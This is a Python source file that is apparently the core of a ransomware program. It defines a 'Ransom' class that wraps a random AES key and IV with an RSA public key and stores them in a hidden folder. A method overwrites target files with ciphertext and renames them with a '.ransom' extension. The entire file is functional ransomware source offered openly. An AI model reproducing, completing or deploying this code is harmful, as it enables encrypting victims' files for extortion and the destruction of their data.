from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from base64 import b64encode
import os
import json
import md5

class Ransom(object):
    def __init__(self, key_path="key.pub", key_size=2048):
        self.file_ext = ".ransom"
        self.hashlist = {} 
        self.hidepath = os.getcwd()+"/ransomware"
        os.mknod("/tmp/.ransomware.lock")
        key = get_random_bytes(16)
        md5_key = md5.new(key).hexdigest()
        iv = get_random_bytes(16)
        md5_iv = md5.new(iv).hexdigest()
        self.AEScipher = AES.new(key, AES.MODE_CFB, iv)
        pubkey = open(key_path, 'r').read()
        Pqrsakey = RSA.import_key(pubkey)
        rsakey = PKCS1_OAEP.new(Pqrsakey) 
        hidepath = self.hidepath
        if not os.path.exists(hidepath):
            os.mkdir(hidepath)
        data = {"key": {"string":b64encode(key), "checksum":b64encode(md5_key)},
            "iv": {"string":b64encode(iv), "checksum":b64encode(md5_iv)},
            }
        data = json.dumps(data)
        with open(hidepath+"/data.enc", "w") as file_en, open(hidepath+"/key.pub", "w") as file_key:
            data_c = rsakey.encrypt(data)
            key_digest = Pqrsakey.export_key()
            file_en.write(data_c)
            file_key.write(key_digest)

    def encrypt_file(self, filename):
        key = self.AEScipher
        hashlist = self.hashlist
        file_ext = self.file_ext
        hidepath = self.hidepath
        if os.path.splitext(filename)[1] == file_ext:
            raise OSError("O arquivo ja foi criptografado")
        data = open(filename, "r").read()
        with open(filename, 'w') as file_w:
            data_enc = key.encrypt(data)
            file_w.write(data_enc)
        hashlist[filename] = md5.new(data).hexdigest()
        with open(hidepath+"/file_hash.json", 'w') as hashfile:
            hashfile.write(json.dumps(hashlist))
        os.rename(filename, filename+file_ext)        
